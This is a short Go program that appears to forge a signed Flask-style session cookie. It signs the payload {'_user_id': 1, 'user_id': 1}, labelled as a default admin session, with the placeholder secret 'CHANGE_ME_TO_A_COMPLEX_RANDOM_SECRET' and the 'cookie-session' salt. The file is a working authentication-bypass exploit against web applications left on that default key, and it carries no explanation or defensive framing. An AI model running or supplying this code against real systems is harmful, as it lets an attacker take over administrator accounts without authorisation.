package main

import (
	"crypto/sha1"
	"fmt"

	"github.com/tardc/itsdangerous"
)

func main() {
	singer := itsdangerous.TimestampSigner{
		MaxAge: 0,
		RegularSigner: &itsdangerous.RegularSigner{
			SecretKey:     "CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",
			Salt:          "cookie-session",
			Sep:           ".",
			KeyDerivation: "hmac",
			DigestMethod:  sha1.New,
			Algorithm:     &itsdangerous.HMACAlgorithm{DigestMethod: sha1.New},
		},
	}

	serializer := itsdangerous.URLSafeSerializer{
		RegularSerializer: &itsdangerous.RegularSerializer{
			Marshaller: &itsdangerous.JSONMarshaller{},
			Signer:     &singer,
		}}

	defaultAdminSessionValue := map[string]interface{}{"_user_id": 1, "user_id": 1}
	session, err := serializer.Dumps(defaultAdminSessionValue)
	if err != nil {
		panic(err)
	}

	fmt.Println(session)
}
